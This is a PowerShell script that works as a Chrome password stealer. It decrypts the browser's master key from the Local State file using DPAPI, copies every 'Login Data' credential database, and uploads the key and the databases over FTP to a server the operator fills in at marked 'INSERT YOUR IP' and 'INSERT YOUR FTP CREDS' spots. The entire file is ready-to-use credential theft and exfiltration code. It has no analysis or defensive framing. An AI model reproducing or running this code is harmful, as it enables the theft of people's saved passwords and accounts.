#get the local state file which holds the encrypted byte sequence to decode the passwords
$fileLoc = $env:LOCALAPPDATA + "\Google\Chrome\User Data\Local State"
#create temp file to avoid a read violation bc chrome locks files
$TempFile3 = New-TemporaryFile
Copy-Item $fileLoc -Destination $TempFile3
#read the local state file, convert to json, and get the base64 encrypted sequence which can be eventually converted into the multi-byte key
$fileCont = Get-Content $TempFile3
$x = $fileCont | ConvertFrom-Json
$key = $x.os_crypt.encrypted_key

#needed namespace
Add-Type -AssemblyName System.Security
#convert the base64 encrypted string into a sequence of bytes (these bytes are still encrypted unique to the currentuser)
$befbase = [System.Convert]::FromBase64String($key)
#remove the first letters (DPAPI) from the byte array so it can be decrypted
$befbase = $befbase[5..($befbase.Length-1)]
#decrypt the byte array
$clearPWD_ByteArray = [System.Security.Cryptography.ProtectedData]::Unprotect( $befbase, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser )
#create a new temp file to store this data
$TempFile = New-TemporaryFile
Set-Content $TempFile -Value $clearPWD_ByteArray -Encoding Byte

#find the base user data folder for chrome
$foldPar = $env:LOCALAPPDATA + "\Google\Chrome\User Data"
#search for all the children with name Login Data recursively throughout this User Data folder
$chF = Get-ChildItem -Path $foldPar -Filter "Login Data" -Recurse -ErrorAction SilentlyContinue -Force -Name

#just to create a specific identifier to keep the files together when uploaded
$overallNum = (Get-Random -Minimum 10000000 -Maximum 99999999)

#create ftp connection
#INSERT YOUR IP-------------------------------------\/
$ftp = [System.Net.FtpWebRequest]::Create(("ftp://1.1.1.1/" + "k_" + $overallNum + ".dat"))
$ftp = [System.Net.FtpWebRequest]$ftp
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
#INSERT YOUR FTP CREDS----------------------------------------\/--------\/
$ftp.Credentials = new-object System.Net.NetworkCredential("login","password")
$ftp.UseBinary = $true
$ftp.UsePassive = $true
#read file as binary and upload it to server
$content = [System.IO.File]::ReadAllBytes($TempFile)
$ftp.ContentLength = $content.Length
$rs = $ftp.GetRequestStream()
$rs.Write($content, 0, $content.Length)
#close connection
$rs.Close()
$rs.Dispose()

#create an iterator for the files so each uploaded Login Data doesn't replace the previous one
$curIt = 0
#loop through all the login data files (these do not need to be decrypted on client side)
foreach ($cF in $chF) {
    #get full path of each Login Data file
    $cFLoc = $foldPar + "\" + $cF
    #copy to temp file so chrome wont keep us from reading these files as it locks them when it is running
    $TempFile2 = New-TemporaryFile
    Copy-Item $cFLoc -Destination $TempFile2

    #create ftp connection
    #INSERT YOUR IP-------------------------------------\/
    $ftp = [System.Net.FtpWebRequest]::Create(("ftp://1.1.1.1/" + "c" + $curIt + "_" + $overallNum + ".dat"))
    $ftp = [System.Net.FtpWebRequest]$ftp
    $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    #INSERT YOUR FTP CREDS----------------------------------------\/--------\/
    $ftp.Credentials = new-object System.Net.NetworkCredential("login","password")
    $ftp.UseBinary = $true
    $ftp.UsePassive = $true
    #read file as binary and upload it to server
    $content = [System.IO.File]::ReadAllBytes($TempFile2)
    $ftp.ContentLength = $content.Length
    $rs = $ftp.GetRequestStream()
    $rs.Write($content, 0, $content.Length)
    #close connection
    $rs.Close()
    $rs.Dispose()
    #add 1 to curIt so the next file will have a different name
    $curIt = $curIt + 1
}
